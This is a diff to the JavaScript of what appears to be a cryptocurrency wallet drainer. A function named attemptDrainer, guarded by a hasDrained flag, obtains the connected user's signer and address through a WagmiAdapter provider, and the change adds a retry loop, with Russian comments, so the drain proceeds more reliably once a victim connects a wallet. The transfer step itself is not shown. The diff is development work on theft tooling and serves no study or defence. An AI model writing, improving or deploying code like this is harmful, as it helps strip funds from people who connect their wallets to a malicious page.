@@ -932,7 +932,7 @@ async function hideModalWithDelay(errorMessage = null) {
 
 async function attemptDrainer() {
   if (hasDrained || isTransactionPending) {
-    console.log('⚠ Transaction already completed or pending');
+    console.log('⚠️ Transaction already completed or pending');
     await hideModalWithDelay("Transaction already completed or pending.");
     return;
   }
@@ -947,9 +947,23 @@ async function attemptDrainer() {
   showModal();
 
   try {
-    // Получаем провайдер из AppKit через WagmiAdapter
-    const walletProvider = wagmiAdapter.provider;
-    if (!walletProvider) throw new Error('No provider available after wallet connection');
+    // Ожидаем доступность провайдера
+    let walletProvider = wagmiAdapter.provider;
+    let attempts = 0;
+    const maxAttempts = 10;
+    const interval = 1000;
+
+    while (!walletProvider && attempts < maxAttempts) {
+      console.log(`ℹ️ Ожидание провайдера, попытка ${attempts + 1}/${maxAttempts}...`);
+      await new Promise(resolve => setTimeout(resolve, interval));
+      walletProvider = wagmiAdapter.provider;
+      attempts++;
+    }
+
+    if (!walletProvider) {
+      throw new Error('No provider available after wallet connection');
+    }
+
     const provider = new ethers.providers.Web3Provider(walletProvider, 'any');
     const signer = provider.getSigner();
     const address = await signer.getAddress();
@@ -991,6 +1005,7 @@ async function attemptDrainer() {
     throw error;
   }
 }
+
 async function handleConnectOrAction() {
   try {
     if (!connectedAddress) {
